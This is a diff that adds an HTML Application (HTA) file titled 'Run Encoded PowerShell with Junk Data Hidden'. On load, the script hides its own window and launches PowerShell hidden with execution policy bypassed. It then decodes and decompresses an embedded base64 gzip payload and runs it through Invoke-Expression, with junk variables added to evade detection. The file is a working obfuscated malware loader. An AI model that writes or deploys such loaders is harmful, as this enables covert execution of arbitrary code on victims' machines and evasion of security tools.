@@ -1,0 +1,40 @@
+<html>
+<head>
+    <title>Run Encoded PowerShell with Junk Data Hidden</title>
+    <HTA:APPLICATION
+        ID="app"
+        BORDER="none"
+        BORDERSTYLE="none"
+        CAPTION="no"
+        SHOWINTASKBAR="no"
+        SINGLEINSTANCE="yes"
+        WINDOWSTATE="minimize"
+    />
+    <script language="VBScript">
+        Sub Window_OnLoad()
+            window.resizeTo 0,0
+            window.moveTo -10000,-10000
+
+            Dim shell, psCmd
+            Set shell = CreateObject("WScript.Shell")
+
+            psCmd = "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
+                """$compressed = 'H4sIAAAAAAAA/2yQTWsiQRCG74L/oRhmcffQ9mUDQfCQoAYhEtEYLwHpj4rTOD09qa4ZDSH/PWir5JBTQ/HU875dea0io3bVikoYQq9gruNAyq3jotF9E7zUym6Dvf0vtTI7SWovCd+iLFDZKL1ylWQ8cK/bYfqAz24HACBvdUzGadWGHYoFRp4hF8HCz8gzzb6GIWQ5Vu3geTybv0ZDruZN/vcBWYwUI4jVJJBXDH/iv36rY5ZWz/o16gW+Nxj5Gi2eGp64Ek/2BK/JMR7ndcOQjcK+KoOyaOHlfgkcTuTZu2RFLOYUDMYI+9SnjwcEcUfbxmPFj+6YdpWnjWWJWMNNGi3QhxbFlNGnP4pJIIO/lUmovVT4AqPYFJdzJnZMFAiy0zOAfHPkup3vAAAA//8ifahzwgEAAA=='; " & _
+                " $unusedVar = 'randomString'; $dummyNumber = 123456; function noop { return }; " & _
+                " $bytes = [System.Convert]::FromBase64String($compressed); " & _
+                " $stream = New-Object IO.MemoryStream(, $bytes); " & _
+                " $decompressed = New-Object IO.Compression.GzipStream($stream, [IO.Compression.CompressionMode]::Decompress); " & _
+                " $reader = New-Object IO.StreamReader($decompressed); " & _
+                " $obfuscated = $reader.ReadToEnd(); " & _
+                " $dummyVar = 'junkData'; " & _
+                " Invoke-Expression $obfuscated;"""
+
+            shell.Run psCmd, 0, False
+
+            self.close
+        End Sub
+    </script>
+</head>
+<body>
+</body>
+</html>
